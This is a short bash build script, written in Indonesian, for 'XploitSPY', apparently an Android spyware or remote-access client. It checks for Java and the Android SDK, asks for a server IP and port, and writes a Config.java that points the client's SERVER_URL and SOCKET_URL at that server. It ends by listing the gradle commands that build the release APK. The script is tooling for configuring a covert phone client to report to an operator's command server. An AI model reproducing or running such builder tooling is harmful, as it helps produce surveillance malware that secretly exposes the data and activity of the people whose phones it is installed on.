#!/bin/bash

# XploitSPY APK Builder
# Script untuk membangun APK dengan konfigurasi server

echo "========================================="
echo "   XploitSPY APK Builder"
echo "========================================="
echo ""

# Check if Java is installed
if ! command -v java &> /dev/null; then
    echo "❌ Java tidak ditemukan. Silakan install Java 11 atau lebih tinggi."
    exit 1
fi

# Check if Android SDK is available
if [ -z "$ANDROID_HOME" ]; then
    echo "⚠️  ANDROID_HOME tidak di-set. Menggunakan default path..."
    ANDROID_HOME="$HOME/Android/Sdk"
fi

if [ ! -d "$ANDROID_HOME" ]; then
    echo "❌ Android SDK tidak ditemukan di $ANDROID_HOME"
    echo "   Silakan install Android SDK atau set ANDROID_HOME"
    exit 1
fi

# Get server IP
read -p "Masukkan Server IP Address: " SERVER_IP
if [ -z "$SERVER_IP" ]; then
    echo "❌ Server IP tidak boleh kosong"
    exit 1
fi

# Get server port (default 80)
read -p "Masukkan Server Port [80]: " SERVER_PORT
SERVER_PORT=${SERVER_PORT:-80}

echo ""
echo "Konfigurasi:"
echo "  Server IP: $SERVER_IP"
echo "  Server Port: $SERVER_PORT"
echo ""

# Create config file
CONFIG_FILE="../client/app/src/main/java/com/xploitspy/client/Config.java"
mkdir -p "$(dirname "$CONFIG_FILE")"

cat > "$CONFIG_FILE" << EOF
package com.xploitspy.client;

public class Config {
    public static final String SERVER_URL = "http://$SERVER_IP:$SERVER_PORT";
    public static final String SOCKET_URL = "http://$SERVER_IP:$SERVER_PORT";
}
EOF

echo "✅ File konfigurasi dibuat: $CONFIG_FILE"
echo ""
echo "📦 Membangun APK..."
echo "   (Pastikan Anda sudah setup Android project dengan benar)"
echo ""
echo "Untuk membangun APK, jalankan:"
echo "  cd ../client"
echo "  ./gradlew assembleRelease"
echo ""
echo "APK akan tersedia di: client/app/build/outputs/apk/release/"

